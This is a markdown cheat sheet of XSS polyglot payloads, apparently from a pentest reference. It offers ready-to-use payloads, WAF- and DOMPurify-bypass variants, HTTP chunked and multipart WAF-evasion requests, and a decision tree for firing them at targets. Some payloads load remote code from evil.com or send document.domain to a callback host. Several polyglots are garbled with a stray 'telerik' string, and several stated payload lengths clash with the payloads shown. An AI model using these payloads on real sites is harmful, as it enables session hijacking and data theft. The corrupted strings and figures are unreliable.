# 37 - XSS Polyglot Collection

## Overview

An XSS polyglot is a payload designed to execute JavaScript in multiple injection contexts simultaneously -- HTML body, HTML attributes, JavaScript strings, URL attributes, and more -- without modification. Polyglots save time during initial fuzzing because a single payload can confirm XSS across diverse contexts. This document catalogs famous polyglots, framework-bypassing variants, WAF-bypassing variants, construction methodology, and 30+ ready-to-use payloads.

**Sources:**
- https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
- https://chefsecure.com/courses/xss/recipes/polyglots-the-ultimate-xss-payloads
- https://polyglot.innerht.ml/
- https://undercodetesting.com/advanced-polyglot-xss-payloads-the-ultimate-guide-to-modern-waf-bypass/
- https://blogs.jsmon.sh/dom-xss-is-not-dead-the-rise-of-polyglot-payloads/
- https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/2%20-%20XSS%20Polyglot/
- https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626
- https://y-ates.github.io/secresearch/xss_polyglots/
- https://blog.ostorlab.co/polyglot-xss.html
- https://www.openbugbounty.org/blog/ultimate-xss-polyglot/
- https://medium.com/@gpiechnik/what-are-polyglots-and-how-to-use-them-as-a-pentester-57ff5a58b977
- https://github.com/gprime31/WAF-bypass-xss-payloads
- https://github.com/GlitchNox/WAF-Bypass-XSS-Payloads
- https://portswigger.net/research (Gareth Heyes research)

---

## 1. What Makes a Polyglot

A polyglot XSS payload is engineered to break out of multiple contexts:

| Context | Breakout Mechanism in Polyglot |
|---------|-------------------------------|
| HTML body | Creates a new tag (e.g., `<svg>`, `<img>`) |
| Double-quoted attribute | Closes `"` then injects event handler or new tag |
| Single-quoted attribute | Closes `'` then injects event handler or new tag |
| Unquoted attribute | Space or `>` terminates attribute |
| JavaScript double-quoted string | Closes `"` and escapes to code context |
| JavaScript single-quoted string | Closes `'` and escapes to code context |
| JavaScript template literal | Injects `${expression}` |
| HTML comment | Closes `-->` then injects payload |
| URL attribute (href/src) | Uses `javascript:` protocol |
| Inside `<script>` block | Closes `</script>` then injects new tag |
| Inside `<textarea>`/`<title>` | Closes the raw text element first |

A good polyglot addresses as many of these contexts as possible in a single string.

---

## 2. Famous Polyglots

### 2.1 Gareth Heyes - PortSwigger Polyglot

**Author**: Gareth Heyes (PortSwigger Research)
**Source**: https://portswigger.net/research

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0telerik%telerik%0telerik*/[/[/>/>
```

**Contexts covered**: JavaScript string (single, double, template literal), HTML attributes (quoted, unquoted), URL attributes, script blocks, HTML comments.

### 2.2 Ahmed Elsobky - Ultimate XSS Polyglot

**Author**: Ahmed Elsobky (0xSobky)
**Source**: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//  %0D%0A%0d%0a//</stYle/</titLe/</telerik/</telerik/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>  \x3e
```

**How it works**:
- `jaVasCript:` -- Executes in URL attributes (href, src, action) via javascript: protocol
- `/*-/*` -- Opens JS comment to neutralize surrounding code
- `` `/* `` -- Handles backtick template literal context
- `\`/*` -- Escapes backtick in escaped contexts
- `'/*"/*` -- Handles single and double quoted JS strings
- `*/(/* */oNcliCk=alert() )` -- Closes comment, adds onclick handler for attribute context
- `//` -- JS line comment to neutralize trailing code
- `%0D%0A` -- CRLF for header injection contexts
- `</stYle/</titLe/</scRipt/` -- Closes raw text elements (style, title, script)
- `--!>` -- Closes HTML comments (including malformed ones)
- `<sVg/oNloAd=alert()//` -- SVG tag with onload for HTML body context
- Mixed case evades case-sensitive filters

### 2.3 Brute Logic Polyglot

**Author**: Brute Logic (brutelogic.com.br)

```
"-alert(1)-"'"-alert(1)-"<img src=x onerror=alert(1)>
```

**Contexts**: JS double-quoted string, JS single-quoted string, HTML body.

**Compact variant**:
```
'">><marquee><img src=x onerror=alert(1)>></marquee></marquee>
```

### 2.4 Ashar Javed Polyglot

```
"'>-->*/</script></style></textarea></noscript></xmp><img src=x onerror=alert(1)>
```

**Contexts**: Closes double-quoted attribute, single-quoted attribute, HTML comment, script block, style block, textarea, noscript, and xmp contexts before injecting an img tag.

### 2.5 Mathias Karlsson Polyglot

```
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

**Contexts**: Double-quoted attribute, single-quoted attribute, JavaScript code context.

---

## 3. Multi-Context Polyglots

### 3.1 HTML + JS + Attribute Polyglot

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">'><script>alert(String.fromCharCode(88,83,83))</script>
```

**Contexts**: Single-quoted JS string, double-quoted JS string, single-quoted HTML attribute, double-quoted HTML attribute, HTML comment, script block, HTML body.

### 3.2 Full Coverage Polyglot

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=alert()//>
```

**Contexts covered**:
- `javascript:` -- URL attribute context
- `"` -- Closes double-quoted JS string or HTML attribute
- `/*'/*` -- Handles single-quoted JS and opens block comment
- `` `/* `` -- Handles template literal
- `-->` -- Closes HTML comment
- `</noscript>...</script>` -- Closes all raw text elements
- `<html " onmouseover=` -- New tag with event handler for attribute breakout
- `<svg/*/onload=alert()` -- SVG tag for HTML body context

### 3.3 Compact 7-Context Polyglot

```
-->'"/></sCript><sVg onload=alert()>
```

**Contexts**: HTML comment, double-quoted attribute, single-quoted attribute (partial), self-closing tag, script block, HTML body.

**Length**: 43 characters -- efficient for length-restricted inputs.

---

## 4. Framework-Bypassing Polyglots

### 4.1 Angular Polyglots

```
{{constructor.constructor('alert(1)')()}}
```
Works in Angular 1.x (< 1.6) template injection contexts.

```
{{$on.constructor('alert(1)')()}}
```
Angular sandbox bypass for specific versions.

**Angular + HTML polyglot**:
```
"'>-->{{constructor.constructor('alert(1)')()}}<img src=x onerror=alert(1)>
```

### 4.2 React Polyglots

React escapes by default, but these target `dangerouslySetInnerHTML` or SSR contexts:
```
"><img src=x onerror=alert(1)>
```
Simple but effective when React's output goes through `dangerouslySetInnerHTML`.

### 4.3 Vue.js Polyglots

Vue 2 template injection (when user input in uncompiled templates):
```
{{_c.constructor('alert(1)')()}}
```

Vue + HTML polyglot:
```
"'>{{constructor.constructor('alert(1)')()}}</script><svg onload=alert(1)>
```

### 4.4 jQuery Polyglots

jQuery's `$()` selector acts as an HTML parser when given HTML strings:
```
<img src=x onerror=alert(1)>
```
This executes when passed to `$(userInput)` or `.html(userInput)`.

---

## 5. WAF-Bypassing Polyglots

### 5.1 Cloudflare WAF Bypass Polyglots

```
<details/open/ontoggle=confirm(1)>
```

```
<svg/onload=alert(1)//
```

```
<math><mi//onclick=alert(1)>clickme
```

### 5.2 AWS WAF Bypass Polyglots

```
<img src=x onerror=\u0061lert(1)>
```

```
<svg onload=al\u0065rt(1)>
```

```
<details open ontoggle=con\u0066irm(1)>
```

### 5.3 Akamai WAF Bypass Polyglots

```
<svg/onload="al\x65rt(1)">
```

```
<details open ontoggle=window['al'+'ert'](1)>
```

### 5.4 ModSecurity CRS Bypass Polyglots

```
<a/href=j%0aava%09teleriksc%09telerikri%0apt:alert(1)>click
```

```
<svg/onload=prompt(1)>
```

Low paranoia level (PL1) bypasses:
```
<img src=x onerror=prompt(1)>
```

### 5.5 Generic WAF Bypass Polyglots

```
<svg/onload=alert`1`>
```

```
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

```
<x/onclick=alert(1)>click
```

```
"><img src=x oneonerrorrror=alert(1)>
```
(Targets recursive stripping that removes "onerror" once, leaving valid "onerror")

---

## 6. Sanitizer-Bypassing Polyglots

### 6.1 DOMPurify Bypass Polyglots

DOMPurify bypasses rely on mutation XSS (mXSS) -- the sanitized HTML mutates when parsed by the browser:

```
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

```
<math><mtext><img src=x onerror=alert(1)>
```
(Namespace confusion: MathML context causes browser to re-parse child elements)

**Note**: DOMPurify versions < 2.0.17 had multiple mXSS bypasses. Always check the target's DOMPurify version.

### 6.2 Custom Sanitizer Bypass Polyglots

Custom sanitizers often fail on:

```
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```
(animate tag is often not in sanitizer allowlists)

```
<math><mi//onclick=alert(1)>clickme</mi></math>
```
(MathML tags may not be sanitized)

```
<details open ontoggle=alert(1)>
```
(details/ontoggle often not in filter lists)

---

## 7. Polyglot Construction Methodology

### 7.1 Building a Custom Polyglot

**Step 1: Identify target contexts**
List the contexts you want to cover (e.g., HTML body, JS string, HTML attribute).

**Step 2: Start with the most restrictive context**
Begin with the JavaScript string context since it requires specific breakout characters.

**Step 3: Layer context closers from inside out**
```
// Start: JavaScript double-quoted string breakout
";

// Add: JavaScript single-quoted string breakout
';

// Add: HTML attribute breakout
">

// Add: Script block escape
</script>

// Add: HTML comment escape  
-->

// Add: Raw text element escape
</textarea></title></style>

// Add: Payload that works in HTML body
<svg onload=alert(1)>

// Combine (ordering matters):
';";-->*/</script></style></textarea></title><svg onload=alert(1)>
```

**Step 4: Minimize and test**
Remove unnecessary characters while testing in each target context.

**Step 5: Add obfuscation for WAF bypass**
Apply case variation, encoding, or comment insertion as needed.

### 7.2 Construction Template

```
[JS_STRING_BREAKOUT][ATTRIBUTE_BREAKOUT][COMMENT_CLOSE][RAW_ELEMENT_CLOSE][SCRIPT_CLOSE][EXECUTION_PAYLOAD]
```

Where:
- `JS_STRING_BREAKOUT` = `';"/` or `";'/`
- `ATTRIBUTE_BREAKOUT` = `">` or `'>`
- `COMMENT_CLOSE` = `-->`
- `RAW_ELEMENT_CLOSE` = `</script></style></textarea></title></noscript>`
- `SCRIPT_CLOSE` = `</script>` (if not already covered)
- `EXECUTION_PAYLOAD` = `<svg onload=alert(1)>` or `<img src=x onerror=alert(1)>`

### 7.3 Testing Your Polyglot

Test the polyglot in each of these contexts:

```html
<!-- Context 1: HTML body -->
<div>POLYGLOT_HERE</div>

<!-- Context 2: Double-quoted attribute -->
<div title="POLYGLOT_HERE"></div>

<!-- Context 3: Single-quoted attribute -->
<div title='POLYGLOT_HERE'></div>

<!-- Context 4: Unquoted attribute -->
<div title=POLYGLOT_HERE></div>

<!-- Context 5: href attribute -->
<a href="POLYGLOT_HERE">click</a>

<!-- Context 6: JS double-quoted string -->
<script>var x = "POLYGLOT_HERE";</script>

<!-- Context 7: JS single-quoted string -->
<script>var x = 'POLYGLOT_HERE';</script>

<!-- Context 8: JS template literal -->
<script>var x = `POLYGLOT_HERE`;</script>

<!-- Context 9: HTML comment -->
<!-- POLYGLOT_HERE -->

<!-- Context 10: Inside textarea -->
<textarea>POLYGLOT_HERE</textarea>

<!-- Context 11: Inside script block (not in string) -->
<script>POLYGLOT_HERE</script>

<!-- Context 12: Inside title -->
<title>POLYGLOT_HERE</title>
```

---

## 8. Shortest Polyglots Per Context

### 8.1 Minimal Payloads

| Context | Shortest Payload | Length |
|---------|-----------------|--------|
| HTML body | `<svg onload=alert(1)>` | 22 |
| Double-quoted attribute | `" onmouseover=alert(1) "` | 25 |
| Single-quoted attribute | `' onmouseover=alert(1) '` | 25 |
| JS double-quoted string | `";alert(1)//` | 13 |
| JS single-quoted string | `';alert(1)//` | 13 |
| JS template literal | `${alert(1)}` | 12 |
| HTML comment | `--><svg onload=alert(1)>` | 25 |
| href attribute | `javascript:alert(1)` | 20 |
| Script block | `</script><svg onload=alert(1)>` | 31 |
| Textarea | `</textarea><svg onload=alert(1)>` | 33 |
| Title | `</title><svg onload=alert(1)>` | 30 |

### 8.2 Compact Multi-Context Payloads

**3-context (44 chars)**:
```
'"><svg onload=alert(1)>
```
Covers: double-quoted attribute, single-quoted attribute, HTML body.

**5-context (58 chars)**:
```
';alert(1)//";alert(1)//"><svg onload=alert(1)>
```
Covers: JS single string, JS double string, double-quoted attribute, single-quoted attribute, HTML body.

**7-context (82 chars)**:
```
-->'"/></script><svg onload=alert(1)>
```
Covers: HTML comment, double-quoted attribute, single-quoted attribute, self-closing tag, script block, HTML body, title/textarea (partial).

---

## 9. Unicode Polyglots

### 9.1 Unicode Normalization Exploits

Some applications normalize Unicode characters to ASCII equivalents, enabling filter bypass:

```
＜svg onload=alert(1)＞
```
Fullwidth less-than (U+FF1C) and greater-than (U+FF1E) may normalize to `<` and `>`.

```
＜img src=x onerror=alert(1)＞
```

### 9.2 Unicode Escape Polyglots

```
\u003csvg\u0020onload\u003dalert(1)\u003e
```
Works when the application processes JavaScript Unicode escapes before output.

```
&#x3c;svg onload=alert(1)&#x3e;
```
HTML entity encoding that the browser decodes.

### 9.3 Right-to-Left Override Polyglots

```
<svg onload=alert(1)> followed by U+202E (RLO)
```
The RTL override character can confuse visual inspection while the payload remains functional.

---

## 10. Encoding-Chain Polyglots

### 10.1 Double Encoding

```
%253Csvg%2520onload%253Dalert(1)%253E
```
If the application URL-decodes twice, this becomes `<svg onload=alert(1)>`.

### 10.2 HTML Entity + URL Encoding

```
%26%23x3c%3Bsvg%20onload%3Dalert(1)%26%23x3e%3B
```
URL-decodes to `&#x3c;svg onload=alert(1)&#x3e;`, then browser decodes HTML entities.

### 10.3 Mixed Encoding Polyglot

```
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
```
`alert(1)` encoded as HTML decimal entities within an attribute -- browser decodes before execution.

```
<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```
Same using hex entities.

### 10.4 Base64 Encoded Polyglots

```
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
```
Base64 decodes to `<script>alert(1)</script>`.

---

## 11. Ready-to-Use Polyglot Payload Collection

### Category A: Quick-Test Polyglots (Use These First)

```
# A-01: Compact 3-context (most common scenarios)
'"><svg onload=alert(1)>

# A-02: 5-context quick test
';alert(1)//";alert(1)//"'><svg onload=alert(1)>

# A-03: With raw text element closers
'"></script></style></textarea><svg onload=alert(1)>

# A-04: URL + HTML + JS contexts
javascript:/*'/*"/*--></title></textarea></script><svg onload=alert(1)//>

# A-05: Minimal WAF-friendly
'"><details open ontoggle=alert(1)>
```

### Category B: Comprehensive Polyglots (Full Coverage)

```
# B-01: Ahmed Elsobky Ultimate Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//  %0D%0A%0d%0a//</stYle/</titLe/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>

# B-02: Full context coverage
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></script><html " onmouseover=/*<svg/*/onload=alert()//>

# B-03: Extended context polyglot
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">'><script>alert(String.fromCharCode(88,83,83))</script>

# B-04: Comment-aware polyglot
--!>"><img src=x onerror=alert(1)>'><img src=x onerror=alert(1)>*/alert(1)/*

# B-05: Polyglot with CRLF injection
"'><script>alert(1)</script>%0D%0A%0D%0A<script>alert(1)</script>
```

### Category C: WAF-Bypass Polyglots

```
# C-01: No common keywords
'"><details/open/ontoggle=confirm(1)>

# C-02: Obfuscated function call
'"><svg/onload=self['al'+'ert'](1)>

# C-03: Template literal bypass
'"><svg onload=alert`1`>

# C-04: HTML entity obfuscation
'"><img src=x onerror=&#97;lert(1)>

# C-05: Uncommon tag + event
'"><math><mi//onmouseover=alert(1)>hover</mi></math>

# C-06: SVG animation trigger (no interaction)
'"><svg><animate onbegin=alert(1) attributeName=x dur=1s>

# C-07: Constructor-based (no function name)
'"><img src=x onerror=[].constructor.constructor('alert(1)')()>

# C-08: Double encoding chain
%27%22%3E%3Csvg%20onload%3Dalert(1)%3E

# C-09: Unicode escape in event handler
'"><svg onload=\u0061\u006C\u0065\u0072\u0074(1)>

# C-10: Tab/newline obfuscation
'"><svg	onload
=alert(1)>
```

### Category D: Framework-Specific Polyglots

```
# D-01: Angular 1.x template injection + HTML
{{constructor.constructor('alert(1)')()}}'"><svg onload=alert(1)>

# D-02: Vue 2 template injection + HTML
{{_c.constructor('alert(1)')()}}'"><svg onload=alert(1)>

# D-03: SSTI + XSS combined
{{7*7}}'"><img src=x onerror=alert(1)>${7*7}<%= 7*7 %>

# D-04: jQuery-targeted
'"><img src=x onerror=alert(1)><input onfocus=alert(1) autofocus>

# D-05: React dangerouslySetInnerHTML
"><img src=x onerror=alert(1)>
```

### Category E: Stealth Polyglots (Minimal Signature)

```
# E-01: No angle brackets (attribute context only)
" onfocus=alert(1) autofocus="

# E-02: No common XSS keywords
" onfocus=confirm(1) autofocus x="

# E-03: No parentheses
" onfocus=alert`1` autofocus="

# E-04: Pure JavaScript (no HTML)
';confirm(1)//";confirm(1)//

# E-05: Invisible characters
'"><svg%09onload%09=%09alert(1)>
```

---

## 12. Polyglot Selection Decision Tree

```
START
  |
  v
What are you testing?
  |
  +---> Unknown context (first test) --> Use A-01: '"><svg onload=alert(1)>
  |
  +---> Known HTML body context --> Use <svg onload=alert(1)> or <img src=x onerror=alert(1)>
  |
  +---> Known attribute context --> Use " onfocus=alert(1) autofocus="
  |
  +---> Known JS string context --> Use ';alert(1)//";alert(1)//
  |
  +---> Multiple unknown contexts --> Use B-01 (Ultimate Polyglot)
  |
  +---> WAF detected --> Use C-01 through C-10 based on WAF vendor
  |
  +---> Framework detected (Angular/Vue) --> Use D-01 or D-02
  |
  +---> Length-restricted input --> Use A-01 (24 chars) or shortest per-context payload
  |
  +---> Need comprehensive coverage --> Use B-02 (Full context coverage)
  |
  +---> Sanitizer present --> Use mXSS payloads from Section 6
```

---

## 13. Polyglot Testing Methodology

### 13.1 Systematic Testing Approach

```
Phase 1: Deploy Quick-Test Polyglots (A-01 through A-05)
  - Submit each to the target parameter
  - Check if any execute immediately
  - If yes: Identify which context triggered, refine payload
  - If no: Proceed to Phase 2

Phase 2: Context Analysis
  - Submit canary: xss<>"'`(){}; 
  - Identify which context the input lands in
  - Identify which characters survive unencoded
  - Select context-specific payloads from Section 8

Phase 3: Bypass Engineering
  - If WAF blocks: Try C-series WAF-bypass polyglots
  - If sanitizer strips: Try Section 6 sanitizer-bypass polyglots
  - If filter modifies: Analyze what is filtered, build custom polyglot per Section 7

Phase 4: Framework-Specific
  - If Angular/Vue detected: Try D-series polyglots
  - Check for template injection alongside traditional XSS
```

### 13.2 Polyglot Effectiveness Matrix

| Polyglot | HTML Body | Attr (dbl) | Attr (sgl) | JS String | URL | Comment | Script | Raw Text |
|----------|-----------|------------|------------|-----------|-----|---------|--------|----------|
| A-01 | Yes | Yes | Yes | No | No | No | No | No |
| A-02 | Yes | Yes | Yes | Yes | No | No | No | No |
| A-03 | Yes | Yes | Yes | No | No | No | Yes | Yes |
| A-04 | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| B-01 | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| B-02 | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |

---

## Key Takeaways

1. **Start simple**: Use A-01 (`'"><svg onload=alert(1)>`) as your first test payload. It covers the three most common contexts in 24 characters.
2. **Polyglots are for discovery, not exploitation**: Once XSS is confirmed, switch to context-specific payloads for reliability and stealth.
3. **WAF-bypass polyglots need vendor tuning**: Generic polyglots often trigger WAF signatures. Use vendor-specific variants from Section 5.
4. **Build custom polyglots for complex targets**: Use the construction methodology in Section 7 to craft polyglots tailored to the target's specific filtering.
5. **Test systematically**: Use the decision tree in Section 12 to select the right polyglot for each situation.
6. **Length matters**: In restricted contexts (URL parameters, HTTP headers), use the shortest effective polyglot from Section 8.

---
## [2024-2026 Research Update]

### "Dancer in the Dark" -- USENIX Security 2024 Polyglot Research

**Paper**: "Dancer in the Dark: Synthesizing and Evaluating Polyglots for Blind Cross-Site Scripting" (Kirchner et al., USENIX Security 2024)
**Source**: [USENIX Security 2024 Proceedings](https://www.usenix.org/system/files/usenixsecurity24_slides-kirchner.pdf), [arXiv 2502.08467](https://arxiv.org/pdf/2502.08467)

**Key findings**:
- **20 vulnerabilities discovered** in 18 web-based backend systems across the **Tranco Top 100,000** websites
- Demonstrated that mutually exclusive injection contexts thwart efforts to construct **one** universal XSS polyglot
- However, full coverage can be achieved with a **small optimized set** of polyglots -- one payload per context class
- The research goal shifted from "one universal payload" to finding the **minimal set** of polyglots that covers all test contexts

**Methodology**:
1. Systematically analyzed injection contexts and identified which are mutually exclusive
2. Synthesized optimized polyglot sets using combinatorial optimization
3. Evaluated polyglots for blind XSS detection (where the tester cannot observe which context the payload lands in)
4. Used `dynamic import()` as the payload mechanism to bypass certain CSP configurations that allow `strict-dynamic` but block inline event handlers

**Example polyglot constructions from the research**:
```
# Kirchner-style polyglot with dynamic import() for CSP bypass
javascript:/*'/*"/*-->*/</script><svg/onload=import('//evil.com/x.js')//>

# Variant targeting template literal and JS string contexts
`/*'/*"/*-->*/</script></style></textarea><img src=x onerror=import('//evil.com')>
```

**Implications for testing methodology**:
- Polyglot sets are most valuable for **blind XSS testing**, where the tester cannot observe which context the payload lands in
- Optimizing for minimal polyglot sets rather than a single universal payload is the correct approach
- The shift to `dynamic import()` as the execution mechanism addresses CSP adoption in modern applications
- Testing with 3-5 optimized polyglots provides better context coverage than a single complex one

**Practical recommendations**:
1. Use 3-5 polyglots from different context classes rather than one monolithic payload
2. Include at least one polyglot with `import()` or `fetch()` for CSP-aware contexts
3. Include at least one polyglot targeting raw text elements (`</script>`, `</textarea>`, `</title>`)
4. Include at least one polyglot for attribute contexts (both single and double quoted)
5. For blind XSS: inject all polyglots in the set, since you cannot predict the landing context

### Updated Polyglot Set for 2024-2026 Testing

Based on the Kirchner et al. research and modern framework/CSP adoption:

```
# Modern-01: CSP-aware polyglot with dynamic import
javascript:/*'/*"/*-->*/</script><svg/onload=import(`//evil.com/x.js`)//>

# Modern-02: Template literal + attribute breakout
`'"></script></style></textarea><img src=x onerror=alert(1)>

# Modern-03: Full raw-text-element closer with event delegation
';alert(1)//";alert(1)//--></noscript></title></textarea></style></template></script><details/open/ontoggle=alert(1)>

# Modern-04: Minimal WAF-bypass polyglot
'"><svg/onload=self[`al`+`ert`](1)>

# Modern-05: Blind XSS with callback (no alert dependency)
'"></script></textarea><img src=x onerror=fetch(`//YOUR.XSS.HT/`+document.domain)>
```

---

## [2026 API XSS Research Update]

### JSON/HTML Polyglot Payloads

Payloads designed to be valid (or parseable) in both JSON and HTML contexts, targeting APIs where WAFs inspect JSON but browsers render HTML:

```
# POLY-API-01: JSON value that executes as HTML when Content-Type is wrong
{"search":"<img src=x onerror=alert(1)>","page":1}
# Works when API returns text/html instead of application/json

# POLY-API-02: JSON Unicode escape polyglot
{"name":"<img src=x onerror=alert(1)>"}
# JSON parser decodes < to <, WAF sees escaped form, rendered as HTML if dumped to DOM

# POLY-API-03: JSONP callback injection polyglot
callback=alert(1)//{"data":"test"}
# Validates as JS identifier + comment, executes alert if JSONP endpoint lacks callback validation

# POLY-API-04: GraphQL error message polyglot
{"query":"{ user(id:\"<img src=x onerror=alert(1)>\") { name } }"}
# Payload reflected in GraphQL error message if input echoed without encoding
```

### Multipart Boundary Manipulation Payloads

Targeting WAFs that fail to correctly parse multipart/form-data with non-standard boundaries:

```
# POLY-API-05: Null byte in multipart boundary
Content-Type: multipart/form-data; boundary=----\x00WebKit
# WAF may truncate at null byte, parsing boundary differently than backend

# POLY-API-06: Tab character in header continuation
Content-Type: multipart/form-data;\t
\tboundary=----XSSBoundary
# WAF may not follow header continuation, missing the boundary definition

# POLY-API-07: Multipart with mismatched Content-Type per-part
------Boundary\r\nContent-Disposition: form-data; name="input"\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>\r\n------Boundary--
# WAF inspects as form data; backend may render the part as its declared Content-Type
```

### Content-Type Switching Payloads

Exploiting the 90%+ acceptance rate of multiple content types by backend frameworks:

```
# POLY-API-08: URL-encoded payload sent as JSON
Content-Type: application/json
q=<script>alert(1)</script>
# WAF applies JSON parser (fails silently), backend parses as URL-encoded

# POLY-API-09: JSON payload sent as URL-encoded
Content-Type: application/x-www-form-urlencoded
{"q":"<script>alert(1)</script>"}
# WAF applies URL parser, backend framework may still parse as JSON

# POLY-API-10: XML namespace XSS in JSON Content-Type
Content-Type: application/json
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
# WAF applies JSON parser (fails), backend may process as XML
```

### Chunked Transfer Encoding Payloads

```
# POLY-API-11: Chunk-split keyword bypass
Transfer-Encoding: chunked
3\r\n<sc\r\n4\r\nript\r\n1\r\n>\r\n9\r\nalert(1)\r\n
# WAF sees fragments per-chunk; backend reassembles to <script>alert(1)>

# POLY-API-12: Chunked + body padding (Cloudflare 128KiB bypass)
Transfer-Encoding: chunked
1fff8\r\n[131064 bytes of junk]\r\n1c\r\n<script>alert(1)</script>\r\n0\r\n\r\n
# Payload placed after Cloudflare's inspection limit

# POLY-API-13: Chunk extension TE.TE (James Kettle, 2025)
Transfer-Encoding: chunked
0;ext=value\r\n\r\nGET /xss?q=<script>alert(1)</script> HTTP/1.1\r\n...
# Chunk extension causes parser disagreement between front-end and back-end
```

**Source:** [WAFFLED Paper (arXiv 2503.10846)](https://arxiv.org/html/2503.10846v1); [PayloadsAllTheThings XSS Filter Bypass](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/); [Black Hat USA 2025 - James Kettle](https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-Wednesday.pdf)
